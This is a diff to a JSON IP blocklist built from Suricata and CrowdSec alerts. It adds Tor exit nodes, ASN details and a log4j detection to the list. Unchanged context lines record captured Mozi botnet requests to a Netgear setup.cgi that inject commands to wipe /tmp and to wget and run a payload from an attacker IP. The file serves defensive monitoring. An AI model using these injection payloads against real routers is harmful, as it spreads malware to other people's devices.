@@ -1,70 +1,13 @@
 {
-  "generated_at": "2026-11-20T13:00:00Z",
+  "generated_at": "2026-11-21T01:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 114,
-    "v4": 114,
+    "total": 123,
+    "v4": 123,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "20.83.25.1",
-      "family": "v4",
-      "first_seen": "2026-11-13T18:00:00Z",
-      "last_seen": "2026-11-13T18:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.64.0.0/10",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /druid/index.html"
-      ]
-    },
-    {
-      "ip": "124.29.194.42",
-      "family": "v4",
-      "first_seen": "2026-11-13T13:00:00Z",
-      "last_seen": "2026-11-13T13:00:00Z",
-      "scenarios": [
-        "suricata/ET EXPLOIT HackingTrio UA (Hello, World)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "9541",
-      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
-      "asn_prefix": "124.29.194.0/24",
-      "payloads": [
-        "POST /GponForm/diag_Form?images/"
-      ]
-    },
-    {
-      "ip": "135.119.91.133",
-      "family": "v4",
-      "first_seen": "2026-11-13T19:00:00Z",
-      "last_seen": "2026-11-13T19:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "135.119.0.0/16",
-      "payloads": [
-        "GET /"
-      ]
-    },
     {
       "ip": "185.220.101.105",
       "family": "v4",
@@ -78,7 +21,10 @@
       ],
       "asn": "60729",
       "asn_name": "TORSERVERS-NET Stiftung Erneuerbare Freiheit",
-      "asn_prefix": "185.220.101.0/24"
+      "asn_prefix": "185.220.101.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
     },
     {
       "ip": "165.232.112.247",
@@ -1688,6 +1634,7 @@
         "suricata"
       ],
       "asn": "16276",
+      "asn_name": "OVH OVH SAS",
       "asn_prefix": "176.31.0.0/16"
     },
     {
@@ -1720,6 +1667,7 @@
         "suricata"
       ],
       "asn": "5607",
+      "asn_name": "BSKYB-BROADBAND-AS Sky UK Limited",
       "asn_prefix": "51.182.64.0/18",
       "payloads": [
         "GET /identity"
@@ -1851,6 +1799,9 @@
         "crowdsec",
         "suricata"
       ],
+      "asn": "138423",
+      "asn_name": "CMPAKLIMITED-AS-ENTCORP - CMPak Limited",
+      "asn_prefix": "223.123.34.0/24",
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://223.123.34.110:58426/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://223.123.34.110:58426/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
@@ -1975,6 +1926,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "5650",
+      "asn_name": "FRONTIER-FRTR - Frontier Communications of America, Inc.",
+      "asn_prefix": "50.126.192.0/18",
       "payloads": [
         "GET /identity"
       ]
@@ -2009,6 +1963,7 @@
         "suricata"
       ],
       "asn": "22773",
+      "asn_name": "ASN-CXA-ALL-CCI-22773-RDC - Cox Communications Inc.",
       "asn_prefix": "174.75.0.0/19",
       "payloads": [
         "GET /identity"
@@ -2043,9 +1998,221 @@
       "sources": [
         "suricata"
       ],
+      "asn": "20055",
+      "asn_name": "AS-WHOLESAIL - Wholesail networks LLC",
+      "asn_prefix": "50.37.128.0/17",
       "payloads": [
         "GET /identity"
       ]
+    },
+    {
+      "ip": "204.228.141.31",
+      "family": "v4",
+      "first_seen": "2026-11-20T23:00:00Z",
+      "last_seen": "2026-11-20T23:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "6315",
+      "asn_name": "XMISSION - XMission, L.C.",
+      "asn_prefix": "204.228.128.0/19",
+      "payloads": [
+        "GET /identity"
+      ]
+    },
+    {
+      "ip": "192.42.116.50",
+      "family": "v4",
+      "first_seen": "2026-11-20T21:00:00Z",
+      "last_seen": "2026-11-20T21:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 56"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "215125",
+      "asn_name": "Cyberology-AS Church of Cyberology",
+      "asn_prefix": "192.42.116.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "171.25.193.45",
+      "family": "v4",
+      "first_seen": "2026-11-20T18:00:00Z",
+      "last_seen": "2026-11-20T18:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 19"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "198093",
+      "asn_name": "DFRI-AS Foreningen for digitala fri- och rattigheter",
+      "asn_prefix": "171.25.193.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "195.47.238.50",
+      "family": "v4",
+      "first_seen": "2026-11-20T18:00:00Z",
+      "last_seen": "2026-11-20T18:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 63"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "30893",
+      "asn_prefix": "195.47.238.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "192.42.116.65",
+      "family": "v4",
+      "first_seen": "2026-11-20T18:00:00Z",
+      "last_seen": "2026-11-20T18:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 57"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "215125",
+      "asn_name": "Cyberology-AS Church of Cyberology",
+      "asn_prefix": "192.42.116.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "185.220.101.101",
+      "family": "v4",
+      "first_seen": "2026-11-20T18:00:00Z",
+      "last_seen": "2026-11-20T18:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 31"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "60729",
+      "asn_name": "TORSERVERS-NET Stiftung Erneuerbare Freiheit",
+      "asn_prefix": "185.220.101.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "45.13.225.69",
+      "family": "v4",
+      "first_seen": "2026-11-20T18:00:00Z",
+      "last_seen": "2026-11-20T18:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 106"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "185.220.101.2",
+      "family": "v4",
+      "first_seen": "2026-11-20T18:00:00Z",
+      "last_seen": "2026-11-20T18:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 39"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "60729",
+      "asn_name": "TORSERVERS-NET Stiftung Erneuerbare Freiheit",
+      "asn_prefix": "185.220.101.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "185.129.61.10",
+      "family": "v4",
+      "first_seen": "2026-11-20T18:00:00Z",
+      "last_seen": "2026-11-20T18:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 25"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "210731",
+      "asn_name": "DOTSRC Forening for DotSrc",
+      "asn_prefix": "185.129.61.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "192.42.116.113",
+      "family": "v4",
+      "first_seen": "2026-11-20T18:00:00Z",
+      "last_seen": "2026-11-20T18:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 53"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "215125",
+      "asn_name": "Cyberology-AS Church of Cyberology",
+      "asn_prefix": "192.42.116.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "185.220.100.242",
+      "family": "v4",
+      "first_seen": "2026-11-20T18:00:00Z",
+      "last_seen": "2026-11-20T18:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 30"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "205100",
+      "asn_name": "F3NETZE F3 Netze e.V.",
+      "asn_prefix": "185.220.100.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "89.222.96.216",
+      "family": "v4",
+      "first_seen": "2026-11-20T23:00:00Z",
+      "last_seen": "2026-11-20T23:00:00Z",
+      "scenarios": [
+        "suricata/ET EXPLOIT Possible Apache log4j RCE Attempt - 2021/12/12 Obfuscation Observed M2 (udp) (Outbound) (CVE-2021-44228)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "212238",
+      "asn_name": "CDNEXT Datacamp Limited",
+      "asn_prefix": "89.222.96.0/23"
     }
   ]
 }
